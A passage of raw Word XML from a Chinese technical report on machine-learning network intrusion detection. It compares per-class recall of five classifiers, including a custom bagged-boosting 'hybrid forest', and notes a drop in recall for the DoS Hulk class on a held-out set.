        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-3　五模型对比脚本的实测输出（本机终端）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F73451">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这张表有两处读法要说清。第一，标准差（0.024）比模型之间的差距（0.0011）大一个量级，所以“五选一”应当如实写成并列：滚动均值只能把逻辑回归拉出来（它确实差一档），区分不出前四名。最终按均值选 XGBoost 上线，理由是它每一折都不垫底且推理最快，不是因为“它更强”。第二，退化不是“越往后越差”的单调漂移：折 1 与折 3 都在 0.99 以上，难的是折 2（0.94 附近）。难样本卡在中间，说明数据里有一段时间的流量形态与其它时段不同，而不是分布持续右移——这一点不能写成“时间越久越不准”，数据不支持那个解释。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53454282">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>按类看召回，能发现一个被总体准确率盖住的事实：退化集中在 DoS Hulk 一类，其余五类基本持平。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F471F0">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-7　最后 10% 封存集上的分类召回</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701"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr w14:paraId="2EA68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DEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55E9AEBC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>模型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="121E99B8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>BENIGN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="718AA14A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DDoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="684235F1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DoS Hulk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6F2E0D94">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Patator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="09AC7C87">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>PortScan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="1751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10E8B05B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>决策树</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="400EA071">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.977</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="01254B82">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.996</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="674BF758">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.899</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3185E4B0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.964</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2CEBD1EF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.991</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3D6B8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20A9DDC3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>随机森林</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="02880094">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.975</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5628DC7F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.993</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="13F68611">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.815</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="58B3935C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.974</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="478FCA75">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.990</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="04FE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814" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="35AE12E8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>XGBoost</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3CAB1697">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.969</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="08A7803F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.996</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="17376F9F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.913</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="36D767D9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.997</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1453ED5F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.998</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="236D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3D1051AA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>逻辑回归</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1A809DB2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.961</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="07DDBA3C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.993</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="04D9ADFB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.972</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F758D00">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.992</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5A4DFBF7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.994</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="53D2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F30388D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>混合森林</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="57636F41">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.998</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D12D8C2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.993</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="42D7E557">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.629</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="14793340">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.945</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0594DBE9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.993</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C49AFC6">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57A16767">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>同样这几个模型在验证段上 DoS Hulk 召回都在 0.99 以上。含义是：一句“准确率 0.97”会把一类攻击的显著退化盖住，报告必须按类报召回。混合森林掉到 0.629 最狠，我们没有单独做消融定位成因，先如实记为观测事实，不写成解释。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756266C8">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.5 混合森林与两条副产物结论</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10918B5E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第五个模型是本组自己设计的“混合森林”：Bagging 骨架不变（bootstrap 采样 + 随机特征子集，深度约束 24 层），但每个基学习器不再是一棵 CART，而是从 XGBoost、LightGBM、CatBoost 中随机抽一个训练出的小型提升模型（内部浅树 6 层、100 轮），最后软投票聚合。动机是让 Bagging 压方差、Boosting 压偏差两头都管。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAF99F4">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="3419475"/>
            <wp:effectExtent l="0" t="0" r="146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72000" cy="3420000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DFFDB0">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-4　混合森林内部结构（外层 Bagging，内层随机抽取的提升器，软投票聚合）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D869580">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>实现上有三个要点。基学习器内部必须是浅树——GBDT 的表达能力来自“很多棵浅树叠加”，一棵 24 层的树几乎就能把训练集拟合完，后续提升轮次没有残差可学，等于退化成“换了个库跑单棵 CART”。三个库的概率尺度要统一，软投票前各走各自的 predict_proba。训练成本要按“树”算：XGBoost/LightGBM 多分类每轮每类各长一棵树（100 轮 × 6 类 = 600 棵/基学习器），CatBoost 每轮只长一棵（叶子是 6 维向量），所以 24 个基学习器共 8×600 + 8×600 + 8×100 = 10 400 棵树。报告里报成本要报到树数，只写“100 轮”会让读者把量级估小 6 倍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1639A3EC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
